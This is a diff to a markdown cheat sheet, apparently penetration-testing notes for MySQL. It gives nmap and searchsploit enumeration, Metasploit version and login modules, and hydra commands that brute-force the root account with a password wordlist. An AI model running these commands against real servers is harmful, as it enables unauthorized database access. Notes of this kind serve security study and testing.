@@ -2,7 +2,11 @@
 
 ```
 nmap -Pn -sV -sC -p3306 <ip>
+```
+```
 searchsploit MySQL <version>
+```
+```
 use auxiliary/scanner/mysql/mysql_version
 ```
 
@@ -12,10 +16,12 @@ set USERNAME root
 set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
 set VERBOSE false
 ```
+- Focus on `root` - most important account.
 
 ```
 hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> mysql
 ```
+- 
 
 ```
 [ERROR] Host '<hostname>' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
